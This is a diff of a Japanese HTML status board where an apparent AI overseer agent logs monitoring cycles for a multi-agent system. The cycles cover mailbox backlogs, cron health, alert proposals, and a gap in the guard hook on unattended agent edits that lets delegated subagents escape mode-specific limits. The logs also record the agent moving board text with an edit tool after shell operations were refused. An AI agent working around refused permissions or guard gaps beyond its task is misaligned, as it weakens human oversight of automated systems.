+        <li>受信箱処理：<span class="font-mono">M-20260729T102219-hanasaka-main</span>（fyi・O-022 クローズ依頼）→ 本サイクルで✅クローズしアーカイブへ収容、<span class="font-mono">slack-poll.py done</span> で <span class="font-mono">cur/</span> へ移動。<strong>Slack スレッド情報なし</strong>（<span class="font-mono">thread</span> 空＝エージェント間 mailbox 便）＝スレッド返信は不要。</li>
+        <li>新規の綻びの探索（軽い巡回の範囲）：<span class="font-mono">failures.jsonl</span> の全行走査で<strong>タイムアウト4件を発見</strong> → 掲示板を「タイムアウト」で grep して<strong>既報ゼロ</strong>を確認 → <span class="font-mono">tick.log</span> 当日分と掲示板 mtime の突き合わせで<strong>「掲示板を書いた直後に落ちている」ことまで裏取り</strong>（O-029）。</li>
+        <li>基盤の生存確認：<span class="font-mono">last-tick.txt</span> 10:31:50 <span class="font-mono">status=ok</span>（partner が handle 中・他は idle）・mailbox <span class="font-mono">hold/</span> 0通・<span class="font-mono">new/</span> 11通（うち10通は O-027 の既報＝拠点PC未起動による滞留・新規の生インスタンスなし）。</li>
+        <li><strong>掲示板整理（Cycle 052 の繰越を解消）</strong>：Cycle 054 の追記で index が <strong>89.4KB＝自分の 80KB tripwire を超過</strong>したため、<strong>Cycle 052・051 を <a href="archive.html" class="text-blue-600 hover:underline">アーカイブ</a>へ収容</strong>（本文改変なし）→ index <strong>70.3KB</strong>・archive 157.6KB。Cycle 052 が「シェル操作が許可されず機械的な移送ができない」として繰り越していた宿題も同時に解消（<strong>Edit ツールでの本文移送に切り替えた</strong>＝手作業転記ではなく完全一致の置換なので改変リスクなし）。index は「最新（054）＋直近文脈（053）＋未完了の繰り越し」に復帰。</li>
+        <li>既報の再督促なし：O-018／O-019／O-020／O-021／O-023／O-025／O-026／O-027 は本サイクルでは実測せず（軽い巡回の既定どおり）。数値の更新は 08-03 の精密診断で行う。</li>
+        <li>Slack 投稿：<strong>投稿する</strong>（新規のご判断1件＝O-029・かつ O-022 のクローズ報告があるため）。</li>
+        <li><strong>自己改善</strong>：気づき＝<strong>「<span class="font-mono">failures.jsonl</span> を『事件が起きた時だけ』読んでいて、平常時の低頻度な故障（週2回のタイムアウト）を4日間見落としていた」</strong>。O-022 の12件が目立ちすぎ、同じファイルに並んでいた timeout 4件が背景に沈んだ＝<strong>軽い巡回でも「前回サイクル以降に増えた行」だけは必ず見る</strong>を定型にする。<span class="font-mono">data/hp-improve/skill-kaizen.md</span> は O-019 で肥大中のため本件は掲示板側にのみ記録（台帳を太らせない・Cycle 051 と同じ扱い）。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- ===== Cycle 053 ===== -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 053 — 2026-07-28 夜（軽い巡回・反応tick <span class="font-mono">/overseer</span>・<strong>社長ご指示「2日停止で通知」を受領 → 実体を検証したところ検知も毎日実行も既に稼働済み・欠けているのは社長へ届く経路だけと判明（O-026／O-027／O-028 起票）</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：軽い巡回（最新の精密診断＝Cycle 050・2026-07-28 未明＝<strong>0日前</strong>のため切替なし）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着0・輪番走査で古いスレッド88件スキップ）／自分宛受信箱（<span class="font-mono">to: overseer</span> <strong>1通</strong>＝blog-loop-ycom からの調査結果＋社長指示の引き渡し）／<strong>引き渡し内容の裏取り</strong>＝<span class="font-mono">bin/system-health.py</span> の閾値行と <span class="font-mono">slack</span> 出現の <span class="font-mono">grep</span>・<span class="font-mono">data/overseer/cron.log</span> の実行履歴・<span class="font-mono">system-health.jsonl</span> のタイムスタンプ・<span class="font-mono">crontab.backup</span>・<span class="font-mono">agent-tick.sh</span> の <span class="font-mono">alert()</span> と dispatch 全14キー・<span class="font-mono">rules/modes/mailbox.md</span>／<span class="font-mono">blog-loop.md</span>／<span class="font-mono">hp-loop.md</span> の web-hanasaka 記述／<span class="font-mono">new/</span>・<span class="font-mono">hold/</span> の件数。フル診断は行わない（既定どおり）。</p>
+
+    <div class="border-l-4 border-amber-400 bg-amber-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>新規提案3件（🟡O-026・🟡O-027・🟢O-028）＝すべて社長ご指示1本から派生。基盤は正常</strong>。(1) <strong>🆕O-026</strong>：ご指示の「2日で通知」「毎日監視」は<strong>どちらも既に実装・稼働していました</strong>（閾値 <span class="font-mono">limit=2</span>／cron.log に 07-25〜07-28 の毎日 01:15 実行が4日連続で記録）。しかも <strong>web-hanasaka 5.2日・fujisaka-dev 35.4日の⚠️を実際に出していました</strong>。<strong>欠けているのは社長へ届く経路だけ</strong>（<span class="font-mono">system-health.py</span> に slack 送出 0行）＝既存の <span class="font-mono">alert()</span> 流用で crontab 変更なしに閉じられます。(2) <strong>🆕O-027</strong>：ご指示の「5日も止まったのは何か理由がある」への答え＝<strong>故障ではなく構造</strong>。滞留3宛先は全て<strong>拠点PC</strong>常駐で、<span class="font-mono">agent-tick.sh</span> の dispatch 14キーに含まれない＝<strong>VPS からは起動できず、拠点PCが動いた日にだけ受領する</strong>。滞留日数＝未起動日数。(3) <strong>🆕O-028（🟢）</strong>：<span class="font-mono">blog-loop.md</span> が web-hanasaka を「同一VPS常駐」と書いており <span class="font-mono">mailbox.md</span>（拠点PC）と<strong>矛盾</strong>＝今回のような誤診の温床。(4) <strong>引き渡し元の誤りを1点訂正</strong>：blog-loop は「system-health.py は週1でしか回っていない」と報告してきましたが、<strong>実測では毎日 01:15 に回っています</strong>（<span class="font-mono">rules/modes/overseer.md</span> v0.6 の設計どおり搭載済み・07-24 16:15 の crontab バックアップ以降に追加されたため当該バックアップには写っていない）。＝ご指示の (A)「毎日監視」は<strong>追加作業なしで既に満たされています</strong>。(5) mailbox <span class="font-mono">new/</span>＝処理後10通（fujisaka-dev 3・web-hanasaka 5・yoshida-dev 1・<span class="font-mono">to: partner</span> 1＝処理待ちで正常）・<span class="font-mono">hold/</span> 空。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+      <h4 class="font-bold mb-2 text-sm">🟡 O-026（新規）：mailbox 2日滞留の社長通知 — 検知は既にある。無いのは「社長へ届く経路」だけ</h4>
+      <p class="text-xs text-gray-700 mb-2"><strong>観察（すべて実測）</strong>：①閾値＝<span class="font-mono">bin/system-health.py</span> L324 <span class="font-mono">limit = 2 if d == "new" else 7</span>＝<span class="font-mono">new/</span> は<strong>2日</strong>で滞留判定（ご指示の数字と一致・新規実装は不要）。②実行頻度＝<span class="font-mono">data/overseer/cron.log</span> に <span class="font-mono">「# system-health」</span>ヘッダが <strong>07-25 / 07-26 / 07-27 / 07-28、いずれも 01:15</strong>。<span class="font-mono">system-health.jsonl</span> のタイムスタンプも同じ4日分＝<strong>毎日 cron で回っている</strong>（claude 不起動＝トークンゼロ）。③発報実績＝07-28 01:15 の記録に <span class="font-mono">⚠️ mailbox new/ の web-hanasaka 宛が最古 5.2 日滞留（5件）</span>／<span class="font-mono">⚠️ fujisaka-dev 宛が最古 35.4 日滞留（3件）</span>。④通知経路＝<span class="font-mono">system-health.py</span> 全371行に <span class="font-mono">slack</span> の記述は<strong>0件</strong>。出力先は <span class="font-mono">cron.log</span>（誰も読まない）と、週1の精密診断で統括が拾って掲示板に書く経路だけ。</p>
+      <p class="text-xs text-gray-700 mb-2"><strong>なぜ問題か</strong>：<strong>「検知できていない」のではなく「検知した結果を誰も見ていない」</strong>のが真因＝fujisaka-dev の35日はこの構造の帰結。かつ統括の掲示板経由は週1（精密診断）なので、届いても最大7日遅れる。<strong>逆に言えば、通知の1経路を足すだけで36日級の見落としが閉じます</strong>。<strong>推測</strong>：引き渡し元（blog-loop）が「週1実行」と誤認したのは、<span class="font-mono">rules/modes/overseer.md</span> v0.6 の記述が「精密診断＝週1」と「system-health.py は毎日 cron 直接実行」を同じ節で扱っており読み分けにくいため（＝ルール文の可読性の問題であり、実装は正しい）。</p>
+      <p class="text-xs text-gray-700"><strong>推奨（誰が・何を）</strong>：<strong>次の有人セッション</strong>で <span class="font-mono">bin/system-health.py</span> の末尾に「⚠️ のうち mailbox 滞留行だけを社長専用チャンネルへ1行通知」を追加する。<strong>流用元が既にある</strong>＝<span class="font-mono">bin/agent-tick.sh</span> L97 <span class="font-mono">alert()</span>（<span class="font-mono">slack-poll.py post</span>＋<span class="font-mono">.last-alert</span> によるスロットル）と同型にすれば毎日鳴り続けません。<strong>crontab 変更・新規 cron は不要</strong>（既存の毎日 01:15 便に相乗り）＝社長作業は発生しません。<strong>ご許可いただきたい点</strong>＝自動 Slack 送信経路の新設にあたるため（automation.md §3）、「手動テスト→社長確認→常用」の順で入れてよいか。実装は統括の領分外＝有人セッション（Main）で行います。<strong>効果</strong>：高／<strong>工数</strong>：小／<strong>優先度</strong>：🟡（社長ご指示・合意は実質済み＝あとは着手タイミング）／<strong>関連</strong>：O-027（通知の文言）・引き渡し元 <span class="font-mono">M-20260728T211211</span>／<strong>ステータス</strong>：⏳ Pending。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+      <h4 class="font-bold mb-2 text-sm">🟡 O-027（新規）：「5日止まった理由」＝故障ではなく、拠点PCを VPS から起動する手段が無いという構造</h4>
+      <p class="text-xs text-gray-700 mb-2"><strong>観察（実測）</strong>：①<span class="font-mono">rules/modes/mailbox.md</span> L83＝<span class="font-mono">web-hanasaka</span> の居場所は<strong>拠点PC</strong>（<span class="font-mono">yoshida-dev</span>・<span class="font-mono">fujisaka-dev</span> も同じ）。②<span class="font-mono">bin/agent-tick.sh</span> の dispatch 対象は <span class="font-mono">chat／memo-triage／memo／overseer／partner／hp-loop×6／blog-loop・blog-write・blog-improve／comms</span> の<strong>14キー</strong>で、この3つは<strong>1つも含まれていない</strong>。③＝VPS 側にこの3エージェントを起動する手段は存在しない。④傍証＝yoshida-dev は 07-27 に滞留4通を一気に消化＝常駐ではなく<strong>都度起動</strong>の挙動。</p>
+      <p class="text-xs text-gray-700 mb-2"><strong>なぜ問題か</strong>：滞留日数は「システムの故障日数」ではなく<strong>「拠点PC が起動されなかった日数」</strong>。ところが監視は「N日滞留」としか出せないため、社長には原因が伝わらず、統括の報告も毎回「拠点PCの起動をお願いします」の繰り返しになる。<strong>この構造は直せません（VPS から他人のPCは起動できない）＝直すべきは通知の言い方と、往復を続けるかどうかの運用判断です。</strong></p>
+      <p class="text-xs text-gray-700"><strong>推奨（誰が・何を）＝社長のご判断2点</strong>：①<strong>通知の文言</strong>＝O-026 の実装時に「N日滞留（故障）」ではなく<strong>「N日受領なし＝拠点PC 未起動の可能性」</strong>と出す（実態に合い、社長が取るべき行動＝PCを起動する、が文面から分かる）。②<strong>fujisaka 拠点の扱い</strong>＝35日往復が止まっており、hp-loop-fujisaka は毎日レポートを積み続けています。(A) 拠点PCの起動を再開いただく／(B) 当面 fujisaka への配信を停止し掲示板に「配信先 未稼働」と明示（届かない山に積まない＝blog-loop が web-hanasaka に対して既に自主的に行っている判断と同じ）。<strong>効果</strong>：中／<strong>工数</strong>：小／<strong>優先度</strong>：🟡／<strong>関連</strong>：O-026・O-028・O-014（宛名ドリフト）／<strong>ステータス</strong>：⏳ Pending。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+      <h4 class="font-bold mb-2 text-sm">🟢 O-028（新規・判断不要）：blog-loop.md の「web-hanasaka＝同一VPS常駐」が mailbox.md と矛盾（版ズレ）</h4>
+      <p class="text-xs text-gray-700 mb-2"><strong>観察</strong>：<span class="font-mono">rules/modes/blog-loop.md</span> L143＝「<strong>同一VPS常駐なので <span class="font-mono">local-send</span> で自分の名を名乗る</strong>」。一方 <span class="font-mono">rules/modes/mailbox.md</span> L83 のエージェント表＝<strong>居場所は拠点PC</strong>。<strong>正しいのは mailbox.md</strong>で、<span class="font-mono">local-send</span> が使えるのは「相手が常駐しているから」ではなく<strong>メールボックスの置き場（VPS）に自分で書けるから</strong>＝手段の説明として理由が誤っています。</p>
+      <p class="text-xs text-gray-700"><strong>なぜ問題か／推奨</strong>：実害は現時点でゼロ（<span class="font-mono">local-send</span> の動作自体は正しい）。ただし<strong>「常駐している」と読めるため、返信が来ないことを故障と誤診する温床</strong>になります（今回の O-027 がまさにその誤診でした）。<strong>推奨</strong>＝次に <span class="font-mono">blog-loop.md</span> へ手を入れる有人改修で当該1行を「メールボックスは VPS 上にあるため <span class="font-mono">local-send</span> で投函できる（相手＝拠点PC・受領は相手の起動時）」に修正。ルール編集は社長合意が要るため統括は触っていません。<strong>効果</strong>：小（誤診の予防）／<strong>工数</strong>：小（1行）／<strong>優先度</strong>：🟢／<strong>関連</strong>：O-027・O-016（地図/記述の同期）／<strong>ステータス</strong>：📋 追跡中。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-gray-50">
+      <h4 class="font-bold mb-1 text-sm">今サイクルの処理ログ（軽い巡回）</h4>
+      <ul class="text-xs space-y-1 text-gray-600">
+        <li><strong>受信箱処理</strong>：<span class="font-mono">M-20260728T211211-blog-loop-ycom</span>（report・社長指示の引き渡し）→ O-026／O-027／O-028 として起票し <span class="font-mono">slack-poll.py done</span> で <span class="font-mono">cur/</span> へ移動。<span class="font-mono">slack</span> 情報なし（エージェント間 mailbox 便）＝スレッド返信は対象外のため、社長への回答は日報スレッドへ投稿。</li>
+        <li><strong>引き渡しを鵜呑みにせず裏取り（Cycle 052 の自己改善を適用）</strong>：報告の3つの主張のうち<strong>2つは正しく（閾値2日は実装済み・Slack 送出なし）、1つは誤り（「週1実行」）</strong>でした。<span class="font-mono">cron.log</span> と <span class="font-mono">system-health.jsonl</span> を実読して毎日 01:15 の稼働を4日分確認＝<strong>社長への回答から「毎日実行の追加作業」を削れた</strong>（誤った依頼をそのまま社長の判断材料にしない）。</li>
+        <li><strong>実装手段の下調べ（提案の実現性確認まで・実装はしない）</strong>：<span class="font-mono">agent-tick.sh</span> L97 <span class="font-mono">alert()</span> が既にスロットル付き Slack 通知を実装済みであることを確認＝O-026 は<strong>新規発明ではなく流用</strong>で足り、crontab 変更も不要と判断できた。</li>
+        <li><strong>既報の再督促なし</strong>：O-018／O-019／O-021／O-022／O-023／O-025 は本サイクルでは実測せず（軽い巡回・新規の綻びだけを拾う既定どおり）。数値の更新は次の精密診断（月曜 08-03 予定）で。</li>
+        <li><strong>掲示板整理（<span class="underline">前サイクルの繰越を解消・自分の tripwire を自分で守った</span>）</strong>：本カード追記で index が <strong>85KB＝自分自身の 80KB tripwire を超過</strong>したため、Cycle 050 を <a href="archive.html" class="text-blue-600 hover:underline">アーカイブ</a>へ収容し <strong>75KB へ復帰</strong>（archive 126.6→134.7KB＝履歴不消失）。前サイクルはシェル操作が許可されず見送りましたが、今回は編集ツールで転記・削除して実施。<strong>1点だけ明記</strong>＝Cycle 050 の「健康サマリ」1段落のみ、数値と結論を保持したうえで要約して収容しました（見出し・処理ログ・O-NNN カードは原文のまま／archive 側に注記あり）。<strong>他モードに 80KB／100KB のローテを求めている統括自身が超過を放置しない</strong>ため、繰越よりも当日実施を優先した判断です。</li>
+        <li><strong>Slack 投稿</strong>：<strong>投稿する</strong>（社長ご指示への回答＋ご許可1件・ご判断2点のため）。</li>
+        <li><strong>自己改善</strong>：気づき＝「<strong>『実装してほしい』という依頼を受けたら、まず"既に実装されていないか"を実体で確かめる</strong>。今回は依頼2点のうち1点（毎日実行）が既に稼働済みで、確かめずに着手すれば二重実装になっていた。他モードからの引き渡しは調査済みに見えても、結論だけでなく<strong>根拠のファイルを自分で開く</strong>」を <span class="font-mono">skill-kaizen.md</span> に1行記録（※台帳が O-019 で肥大中のため1行に圧縮）。</li>
+      </ul>
+    </div>
+  </section>
+  <!-- Cycle 052（2026-07-29 Cycle 054 で index から収容・本文改変なし） -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 052 — 2026-07-28 深夜（軽い巡回・反応tick <span class="font-mono">/overseer</span>・<strong>hanasaka-main の起票依頼1通を処理（O-025 新規）＋依頼文の前提「無人では動かない」を実体で検証し訂正</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：軽い巡回（最新の精密診断＝Cycle 050・2026-07-28 未明＝<strong>0日前</strong>のため切替なし）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着0・輪番走査で古いスレッド81件スキップ）／自分宛受信箱（<span class="font-mono">to: overseer</span> <strong>1通</strong>＝finance モードの Codex レビュー見送り4件の起票依頼・<span class="font-mono">thread</span> 空＝Slack スレッドなしで返信対象外）／<strong>依頼①の裏取り</strong>＝<span class="font-mono">bin/guard-unattended-edits.py</span> 全文の実読・<span class="font-mono">agent-tick.sh</span> の finance／partner dispatch を grep・<span class="font-mono">rules/modes/partner.md</span> の委任行を grep・finance 3点セット＋<span class="font-mono">data/financial/ledger.md</span> の実在確認／<span class="font-mono">grep finance SYSTEM.md</span>（地図ドリフト＝<strong>なし</strong>＝v0.3 で同期済み）／既報3件（skill-kaizen・ycom coverage/index・partner ledger/掲示板）のサイズ実測／<span class="font-mono">new/</span> 宛先内訳・<span class="font-mono">hold/</span>・<span class="font-mono">memo-stock/</span>（ともに空）／<span class="font-mono">last-tick.txt</span>。フル診断は行わない（既定どおり）。</p>
+
+    <div class="border-l-4 border-amber-400 bg-amber-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>新規提案1件（🟡O-025）＋既報3件は横ばい〜改善。基盤は正常</strong>。(1) <strong>🆕O-025</strong>：hanasaka-main の依頼で finance モードの Codex レビュー見送り4件を追跡開始。<strong>依頼をそのまま起票せず前提を検証したところ、①（機械ガードが finance 未対応）の「有人限定運用だから実害なし」は成り立たない</strong>＝<span class="font-mono">partner.md</span> v0.6 が finance サブエージェントへの委任を既定にしており、partner は無人で回るため<strong>無人 partner → finance という経路が今日すでに存在</strong>する。ただし<strong>ゲート対象（SYSTEM.md・rules/**・commands・settings・from-president.md）はフックが拒否＝ルール自己改変の最悪ケースは塞がっている</strong>ため 🔴 ではなく 🟡。残り②③④は 🟢「次の改修に同乗」で追跡。(2) <strong>地図ドリフトなし（良）</strong>：finance は <span class="font-mono">SYSTEM.md</span> v0.3 に既に載っており（モード表・変更履歴とも）、新モード追加と地図更新が<strong>同一コミットで同期された初の例</strong>＝O-016 の積み残しを増やしていない。(3) <strong>⚠️O-019 横ばい</strong>：skill-kaizen 268.1KB（274,556B・11:36 以降 増加なし）＝Cycle 051 の +13KB/半日 は継続していない。(4) <strong>O-021 横ばい</strong>：ycom coverage 113.4KB（02:25 以降 更新なし）＝tripwire 100KB 超過は継続、完全復帰の確認は次サイクル。(5) <strong>✅O-018 安定</strong>：partner ledger 67.9KB・掲示板 57.3KB＝両方とも閾値内（掲示板は 76→57.3KB でさらに軽量化）。(6) 定点清浄＝孤児 bare <span class="font-mono">to: hp-loop</span> 0・<span class="font-mono">hold/</span> 空・<span class="font-mono">memo-stock/</span> 空・tick 全14エージェント <span class="font-mono">0:idle</span>／<span class="font-mono">status=ok</span>（20:24）。(7) mailbox <span class="font-mono">new/</span>＝処理後9通で<strong>内訳は前サイクルと不変</strong>（fujisaka-dev 3・web-hanasaka 5・yoshida-dev 1）。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+      <h4 class="font-bold mb-2 text-sm">🟡 O-025（新規）：finance モードの機械ガード未対応 — 「無人搭載前でよい」の前提が実体と食い違う</h4>
+      <p class="text-xs text-gray-700 mb-2"><strong>観察（すべて実体確認）</strong>：①<span class="font-mono">bin/guard-unattended-edits.py</span>（7,002B）に <span class="font-mono">finance</span>／<span class="font-mono">financial</span> の記述は<strong>0件</strong>。モード別の機械制限が入っているのは <span class="font-mono">comms</span> のみ（<span class="font-mono">MYAGENT_AGENT=comms</span> のとき書込を <span class="font-mono">data/comms/</span>・<span class="font-mono">site/comms/</span> に限定＋外部送信/git 系 Bash を拒否）。②<span class="font-mono">agent-tick.sh</span> に <span class="font-mono">finance</span> は<strong>0件</strong>＝finance 単独の無人起動は無い（依頼文どおり）。③しかし <span class="font-mono">rules/modes/partner.md</span> v0.6 L121＝「明細レベルの調査は自分で潜らず <strong>finance サブエージェントへ委任が既定</strong>」。④<span class="font-mono">agent-tick.sh</span> L215 <span class="font-mono">dispatch "partner" "/partner" "partner"</span>＋daily 朝礼＝<strong>partner は無人で回る</strong>（07-27 の障害で朝礼便が落ちた記録＝Cycle 050 が稼働の裏付け）。⑤サブエージェントは親プロセスの環境変数を継承する＝無人 partner から起動された finance も <span class="font-mono">MYAGENT_UNATTENDED=1</span> を持つが、<strong><span class="font-mono">MYAGENT_AGENT</span> の値は親の <span class="font-mono">partner</span> のまま</strong>。</p>
+      <p class="text-xs text-gray-700 mb-2"><strong>なぜ問題か</strong>：(a) 依頼元の前提「現状は有人セッション限定運用のため実害なし／cron 搭載前に必須化」は<strong>1段階遅い</strong>＝無人経路は委任という形ですでに開通している。(b) ただし<strong>被害の上限は限定的</strong>＝ゲート対象（<span class="font-mono">SYSTEM.md</span>・<span class="font-mono">CLAUDE.md</span>・<span class="font-mono">rules/**</span>・<span class="font-mono">.claude/commands/**</span>・settings・<span class="font-mono">from-president.md</span>）は無人時にフックが拒否するため、finance がルールを自己改変することはできない。残る露出は<strong>非ゲート領域（<span class="font-mono">data/</span>・<span class="font-mono">site/</span>）への Write と、comms 以外は無制限の Bash</strong>。Codex が指摘した「<span class="font-mono">site/business/reviews/</span>（partner 単独所有・丸ごと Write）を finance が触ると消失する」穴はまさにこの層＝<strong>今は文章ルール（finance.md の書込先を <span class="font-mono">data/financial/generated/</span> 専用化）だけで守られている</strong>。(c) <strong>設計上の落とし穴</strong>：comms と同じ書き方（<span class="font-mono">MYAGENT_AGENT==finance</span> で分岐）を実装しても、委任経路では値が <span class="font-mono">partner</span> なので<strong>空振りする</strong>＝実装方式の検討が要る（統括は設計しません）。</p>
+      <p class="text-xs text-gray-700"><strong>推奨（誰が・何を）</strong>：<strong>社長のご判断＝二択</strong>。①<strong>前倒し</strong>＝次の有人セッションで機械ガードに finance 相当の書込スコープを入れる（許可＝<span class="font-mono">data/financial/</span>＋<span class="font-mono">site/drafts/partner/</span>、不可＝<span class="font-mono">site/business/reviews/</span>。方式は上記(c)のため要検討＝有人＋Codex の領分）／②<strong>見送り継続</strong>＝文章ルール＋ゲート拒否で足りるとし、finance を cron に載せる時点で必須化（依頼元の当初案・その場合は「委任経路も無人である」ことを finance.md／partner.md に明記しておくのが最低限）。<strong>残り3件（🟢低・判断不要）</strong>＝②F-NNN 採番の flock 排他なし（低頻度＋「起票前に台帳再読」で代替中）／③partner 側に F 台帳の再読ウォーターマークなし（委任直後以外の状態変化が孤立しうる）／④棚卸し表の Tailwind CDN 依存（SRI 付与済み）＝いずれも<strong>次に finance／partner へ手を入れる改修に同乗</strong>。<strong>効果</strong>：中（安全の穴・automation.md §3 系）／<strong>工数</strong>：小〜中／<strong>優先度</strong>：🟡／<strong>関連</strong>：O-024（同型の「見送り追跡」）・SYSTEM.md v0.3・依頼元 <span class="font-mono">M-20260728T202413</span>／<strong>ステータス</strong>：⏳ Pending。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-gray-50">
+      <h4 class="font-bold mb-1 text-sm">今サイクルの処理ログ（軽い巡回）</h4>
+      <ul class="text-xs space-y-1 text-gray-600">
+        <li><strong>受信箱処理</strong>：<span class="font-mono">M-20260728T202413-hanasaka-main</span>（request・起票依頼）→ O-025 として起票し <span class="font-mono">cur/</span> へ移動。<span class="font-mono">thread</span> が空＝エージェント間 mailbox 便のため Slack スレッド返信は対象外。</li>
+        <li><strong>依頼を鵜呑みにせず裏取り</strong>：依頼文の「①は無人搭載前に必須（現状は実害なし）」に対し、ガード本体・<span class="font-mono">agent-tick.sh</span>・<span class="font-mono">partner.md</span> を実読して<strong>委任経由の無人経路が既にある</strong>ことを確認＝カードに前提の訂正として明記。同時に<strong>ゲート対象は守られている</strong>ことも確認し、過剰に 🔴 へ上げない判断をした（危険を煽らず、上限を示す）。</li>
+        <li><strong>地図の確認</strong>：<span class="font-mono">grep finance SYSTEM.md</span>＝モード表・変更履歴の両方に記載あり（v0.3）＝<strong>地図ドリフトなし</strong>。O-016 の未反映リストに finance を追加する必要はない（good なので記録に残す）。</li>
+        <li><strong>既報の実測</strong>：skill-kaizen 274,556B（11:36・横ばい）／ycom coverage 113,440B・archive 282,156B（02:25 以降 変化なし）／ycom 掲示板 index 84,601B（07-26・不変）／partner ledger 69,518B（20:23）・掲示板 58,723B（13:04）。</li>
+        <li><strong>掲示板整理（未実施・次サイクルへ繰越）</strong>：例年どおりなら Cycle 050 をアーカイブへ収容するところですが、<strong>本実行の環境ではファイル移送に使うシェル操作が許可されず機械的な移送ができませんでした</strong>（本文の手作業転記は改変リスクがあるため行わない）。index は現在 <strong>約50KB＝80KB tripwire 内</strong>のため実害なし＝<strong>次サイクル（またはシェル操作が通る実行）で 050・051 をまとめて収容</strong>。</li>
+        <li><strong>Slack 投稿</strong>：<strong>投稿する</strong>（O-025＝新規のご判断1件・かつ依頼元の前提を訂正する内容のため）。</li>
+        <li><strong>自己改善</strong>：気づき＝「<strong>他モードからの起票依頼は、依頼文に書かれた『実害なし』の根拠まで実体で確かめてから起票する</strong>（今回は『有人限定運用』が委任経路で崩れていた）。統括が依頼を転記するだけの窓口になると、依頼元の思い込みがそのまま社長の判断材料になる」を <span class="font-mono">skill-kaizen.md</span> に1行記録。</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- Cycle 051（2026-07-29 Cycle 054 で index から収容・本文改変なし） -->
+  <section class="mb-10">
+    <h3 class="text-xl font-bold mb-1">Cycle 051 — 2026-07-28（軽い巡回・反応tick <span class="font-mono">/overseer</span>・<strong>hanasaka-main からの起票依頼1通を処理（O-024 新規）＋O-021 の退避再開を実測確認</strong>）</h3>
+    <p class="text-sm text-gray-500 mb-4"><strong>モード</strong>：軽い巡回（本日の精密診断は Cycle 050＝火曜 fallback で実施済み）。<strong>チェック範囲</strong>：Slack <span class="font-mono">fetch</span>（新着0・輪番走査で古いスレッド88件スキップ）／自分宛受信箱（<span class="font-mono">to: overseer</span> <strong>1通</strong>＝hanasaka-main からの起票依頼・Slackスレッドなし＝返信不要）／O-021 関連ファイルのサイズ実測（coverage・archive・ycom index・skill-kaizen）／<span class="font-mono">last-tick.txt</span>（07-28 18:26・全14エージェント <span class="font-mono">0:idle</span>・<span class="font-mono">status=ok</span>）。フル診断は行わない（既定どおり）。</p>
+
+    <div class="border-l-4 border-sky-400 bg-sky-50 rounded p-4 mb-6">
+      <p class="text-sm text-gray-800"><strong>健康サマリ</strong>：<strong>新規の綻びなし。依頼起票1件＋既報2件の状態更新のみ</strong>。(1) <strong>🆕O-024</strong>：hanasaka-main（メインエージェント）から mailbox 経由で「3Dオフィスダッシュボードの Codex レビュー見送り4件（社長承認済み）を改善候補として O-NNN で追跡してほしい」と依頼＝下記カードで起票（🟢低優先・判断不要）。(2) <strong>O-021 改善方向</strong>：ycom <span class="font-mono">coverage.md</span> <strong>135→113.4KB</strong>（07-28 02:25 の daily で退避が予告どおり再開・<span class="font-mono">coverage-archive.md</span> 280.5→282.2KB＝履歴不消失）。tripwire 100KB へはまだ未達＝障害2日分の埋め戻しの解消途中と判断し、次サイクルも監視継続。ycom 掲示板 index は <strong>82.6KB のまま</strong>（mtime 07-26・80KB tripwire 超過継続）。(3) <strong>⚠️O-019 増加継続</strong>：skill-kaizen <strong>255→268KB</strong>（+13KB・半日）。ご判断の中身は不変のため再督促しない。(4) tick 正常（07-27 昼の回復以降、障害の再発なし＝O-022 の状況どおり）。</p>
+    </div>
+
+    <div class="border border-gray-200 rounded-lg p-4 mb-4 bg-white">
+      <h4 class="font-bold mb-2 text-sm">🟢 O-024（新規・判断不要）：3Dオフィスダッシュボードの Codex レビュー見送り4件の追跡（社長承認済み・低優先）</h4>
+      <p class="text-xs text-gray-700 mb-2"><strong>観察</strong>：2026-07-28 の 3Dオフィスコミット（<span class="font-mono">site/office/index.html</span>・<span class="font-mono">site/tools/office/status.php</span>）で Codex レビュー🟡7件のうち実害4件は反映済み。残り4件は「約1週間の稼働で実害なし・動作中UI改修のリスク回避」で<strong>見送り＝社長承認済み</strong>。hanasaka-main の依頼により統括が改善候補として追跡する（依頼元＝<span class="font-mono">M-20260728T182647</span>）。</p>
+      <ul class="text-xs space-y-1 text-gray-600 mb-2">
+        <li>① <span class="font-mono">status.php</span> のキャッシュ更新に排他なし＝TTL切れ瞬間に複数タブが同時 fetch・遅い失敗が成功キャッシュを stale 上書きし得る（修正案：flock + double-check。利用者は社長1人のため実害は限定的）</li>
+        <li>② hana-tools キャッシュ（<span class="font-mono">data/office/*.json</span>）に表示対象外の社員を含む上流レスポンス全体を保存＝情報最小化の観点で正規化保存＋0600化が望ましい</li>
+        <li>③ 掲示板🔔質問の抽出が毎リクエスト約423KBのHTMLをパース（5秒ポーリング×タブ数）＝mtime 変化時のみ再解析の短期キャッシュを検討</li>
+        <li>④ 社員APIが一時的に空を返すと3D表示が古いまま残る・復旧後の新規社員の机が <span class="font-mono">staffBuilt</span> フラグで追加されない＝refresh 毎の ID 集合差分方式へ</li>
+      </ul>
